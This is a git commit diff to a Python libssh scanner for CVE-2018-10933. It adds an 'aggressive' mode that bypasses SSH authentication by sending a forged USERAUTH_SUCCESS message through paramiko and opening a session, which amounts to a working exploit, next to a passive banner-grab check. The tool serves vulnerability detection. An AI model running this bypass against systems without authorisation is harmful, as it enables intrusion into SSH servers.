0bc9b3518020af3e029bf282b1af00533fbeb130
Jonathan Broche <jhonnybroche@gmail.com>
2018-10-21 11:23:48 -0400

    added aggressive mode and code clean up

--- README.md
+++ README.md
@@ -3,22 +3,28 @@
 ## Introduction
 -----
 
-This is a python based script to identify hosts vulnerable to CVE-2018-10933. 
+This is a python based script to identify hosts vulnerable to CVE-2018-10933. Libssh scanner has two modes: passive (banner grabbing) and aggressive (bypass auth) to validate vulnerability's existence. By default, libssh scanner uses passive mode but supply the -a argument and aggressive mode will be used which provides more accurate results.
 
 The vulnerability is present on versions of libssh 0.6+ and was remediated by a patch present in libssh 0.7.6 and 0.8.4. For more details: [https://www.libssh.org/2018/10/16/libssh-0-8-4-and-0-7-6-security-and-bugfix-release/](https://www.libssh.org/2018/10/16/libssh-0-8-4-and-0-7-6-security-and-bugfix-release/)
+
+## Installation
+-----
+
+Run `pip install -r requirements.txt` within the cloned libssh-scanner directory.
 
 ## Help
 -----
 
 ```
-CVE-2018-10933 Scanner - Find vulnerable libssh services by Leap Security (@LeapSecurity)
+libssh Scanner - Find vulnerable libssh services by Leap Security (@LeapSecurity)
 
 positional arguments:
   target                An ip address or new line delimited file containing
-                        IPs to banner grab for the vulnerability.
+                        IPs to search for the vulnerability.
 
 optional arguments:
   -h, --help            show this help message and exit
   -v, --version         show program's version number and exit
   -p PORT, --port PORT  Set port of SSH service
+  -a, --aggressive      Identify vulnerable hosts by bypassing authentication
 ```
--- libsshscan.py
+++ libsshscan.py
@@ -2,7 +2,7 @@
 # CVE-2018-10933 Scanner by Leap Security (@LeapSecurity) https://leapsecurity.io
 
 
-import socket, argparse, sys, os
+import socket, argparse, sys, os, paramiko
 
 class colors(object):
     blue = "\033[1;34m"
@@ -23,19 +23,43 @@ def pvulnerable(ip, port, banner):
   print "{yellow}[!]{white} {ipaddr}:{port} is likely VULNERABLE to authentication bypass ({banner})".format(yellow=colors.yellow, white=colors.normal, ipaddr=ip, port=port, banner=banner.strip()) 
 
 
-def bannergrab(ip, port):
+def passive(ip, port): #banner grab to verify vulnerable host
   try:
-    s = socket.create_connection((ip, port), timeout=0.30000)
+    s = socket.create_connection((ip, port), timeout=0.50000)
     s.settimeout(None)
     banner = s.recv(1024)
     s.close()
     return banner
   except (socket.timeout, socket.error) as e:
-    return ""
+    ptimeout(ip, port)
 
-parser = argparse.ArgumentParser(description='CVE-2018-10933 Scanner - Find vulnerable libssh services by Leap Security (@LeapSecurity)', version="1.0.0")
+def aggressive(ip, port): #bypass auth to verify vulnerable host
+  try:
+    s = socket.create_connection((ip, port), timeout=0.50000)
+    s.settimeout(None)
+
+    msg = paramiko.message.Message()
+    t = paramiko.transport.Transport(s)
+    t.start_client()
+    with open("paramiko.log") as f: #tmp solution to get banner, can't seem to get _transport.get_banner() working
+      banner =  f.readlines()[-10].split(" ")[-1]
+    msg.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
+    t._send_message(msg)
+    c = t.open_session(timeout=0.50000)
+    s.close()
+    pvulnerable(ip, port, banner)
+  except (socket.timeout, socket.error) as e:
+    ptimeout(ip, port)
+  except paramiko.SSHException as e:
+    pstatus(ip, port, banner)
+    #print e
+  except Exception as e:
+    pass
+
+parser = argparse.ArgumentParser(description='libssh Scanner - Find vulnerable libssh services by Leap Security (@LeapSecurity)', version="1.0.2")
 parser.add_argument('target', help="An ip address or new line delimited file containing IPs to banner grab for the vulnerability.")
 parser.add_argument('-p', '--port', default=22, help="Set port of SSH service")
+parser.add_argument("-a", "--aggressive", action="store_true", help="Identify vulnerable hosts by bypassing authentication")
 
 if len(sys.argv) == 1:
     parser.print_help()
@@ -44,39 +68,39 @@ if len(sys.argv) == 1:
 args = parser.parse_args()
 ips, results = [], []
 
-if not args.target:
-    print "You didn't provide any work for me to do."
-    sys.exit(1)
-
-if args.target:
-      print "\nStatus: Searching for Vulnerable Hosts...\n"
-      if os.path.isfile(args.target): #if file add hosts
-          with open (args.target) as f:
-              for line in f.readlines():
-                  ips.append(line.strip())
-      else: #if not scan the provided IP
-          ips.append(args.target.strip())
+print "\nlibssh scanner {}\n".format(parser.version)
 
 
-for ip in ips:
-  result = ([ip, int(args.port), bannergrab(ip, int(args.port))])
-  if result[2]:
-    if "libssh-0.6" in result[2]: #vulnerable
-      pvulnerable(result[0], result[1], result[2])
-    elif "libssh-0.7" in result[2]: #chjeck if patched
-      if int(result[2].split(".")[-1]) >= 6: #libssh is 0.7.6 or greater (patched)
-        ppatch(result[0], result[1], result[2])
-      else:
-        pvulnerable(result[0], result[1], result[2])
-    elif "libssh-0.8" in result[2]: #chjeck if patched
-      if int(result[2].split(".")[-1]) >= 4: #libssh is 0.8.4 or greater (patched)
-        ppatch(result[0], result[1], result[2])
-      else:
-        pvulnerable(result[0], result[1], result[2])
-    else: #not vulnerable
-      pstatus(result[0], result[1], result[2])
-  else:
-    ptimeout(result[0], result[1])
+if os.path.isfile(args.target): #if file add hosts
+  with open (args.target) as f:
+      for line in f.readlines():
+          ips.append(line.strip())
+else: #if not scan the provided IP
+  ips.append(args.target.strip())
 
+
+print "Searching for Vulnerable Hosts...\n"
+if args.aggressive:
+  paramiko.util.log_to_file("paramiko.log")
+  for ip in ips:
+    aggressive(ip, int(args.port))
+else: #banner grab
+  for ip in ips:
+    banner = passive(ip, int(args.port)) #banner
+    if banner:
+      if "libssh-0.6" in banner: #vulnerable
+        pvulnerable(ip, args.port, banner)
+      elif "libssh-0.7" in banner: #chjeck if patched
+        if int(banner.split(".")[-1]) >= 6: #libssh is 0.7.6 or greater (patched)
+          ppatch(ip, args.port, banner)
+        else:
+          pvulnerable(ip, args.port, banner)
+      elif "libssh-0.8" in banner: #chjeck if patched
+        if int(banner.split(".")[-1]) >= 4: #libssh is 0.8.4 or greater (patched)
+          ppatch(ip, args.port, banner)
+        else:
+          pvulnerable(ip, args.port, banner)
+      else: #not vulnerable
+        pstatus(ip, args.port, banner)
 
 print "\nScanner Completed Successfully"
